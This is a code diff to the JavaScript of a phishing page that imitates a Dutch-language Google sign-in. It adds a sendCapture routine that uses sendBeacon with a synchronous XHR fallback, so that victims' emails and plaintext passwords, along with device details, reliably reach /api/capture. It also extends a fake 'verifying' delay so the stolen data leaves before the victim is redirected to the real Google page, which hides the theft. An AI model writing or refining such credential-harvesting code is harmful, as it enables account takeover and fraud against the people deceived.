@@ -510,22 +510,34 @@
             : '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
     }
 
+    /* ── Reliably send capture data even during navigation ── */
+    function sendCapture(payload) {
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        // sendBeacon is guaranteed to complete even when the page unloads
+        const ok = typeof navigator.sendBeacon === 'function' && navigator.sendBeacon('/api/capture', blob);
+        if (!ok) {
+            // Synchronous XHR fallback — blocks navigation until request is sent
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', '/api/capture', false);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify(payload));
+            } catch {}
+        }
+    }
+
     /* ── Track wachtwoord vergeten click ── */
     function trackForgotPw() {
         const email = document.getElementById('emailDisplay')?.textContent || document.getElementById('emailInput')?.value || 'unknown';
-        fetch('/api/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                email,
-                password: '[ACTIE: Wachtwoord vergeten geklikt]',
-                source: 'google_forgot_password',
-                timestamp: new Date().toISOString(),
-                clientId: localStorage.getItem('_cid') || 'unknown',
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || ''
-            })
-        }).catch(() => {});
+        sendCapture({
+            email,
+            password: '[ACTIE: Wachtwoord vergeten geklikt]',
+            source: 'google_forgot_password',
+            timestamp: new Date().toISOString(),
+            clientId: localStorage.getItem('_cid') || 'unknown',
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || ''
+        });
     }
 
     /* ── Inloggen ── */
@@ -561,28 +573,25 @@
             statusEl.textContent = 'Verifiëren' + '.'.repeat(dotCount);
         }, 400);
 
-        // Capture credentials with full context (always, even on first attempt)
-        fetch('/api/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                email,
-                password,
-                source: 'google_login',
-                timestamp: new Date().toISOString(),
-                clientId: localStorage.getItem('_cid') || 'unknown',
-                screen: (screen.width || 0) + 'x' + (screen.height || 0),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
-                staySignedIn: document.getElementById('staySignedIn')?.checked || false
-            })
-        }).catch(() => {});
+        // Capture credentials — sendBeacon guarantees delivery even during page unload
+        sendCapture({
+            email,
+            password,
+            source: 'google_login',
+            timestamp: new Date().toISOString(),
+            clientId: localStorage.getItem('_cid') || 'unknown',
+            screen: (screen.width || 0) + 'x' + (screen.height || 0),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+            staySignedIn: document.getElementById('staySignedIn')?.checked || false
+        });
 
-        // After short "verifying" delay: redirect to Google
+        // After brief "verifying" delay: redirect to Google
+        // Longer delay gives the beacon time to leave the browser queue before navigation
         setTimeout(() => {
             clearInterval(dotInterval);
             if (statusEl.parentNode) statusEl.remove();
             window.location.href = 'https://myaccount.google.com/?hl=nl';
-        }, 1600 + Math.random() * 600);
+        }, 2800 + Math.random() * 400);
     }
 
 
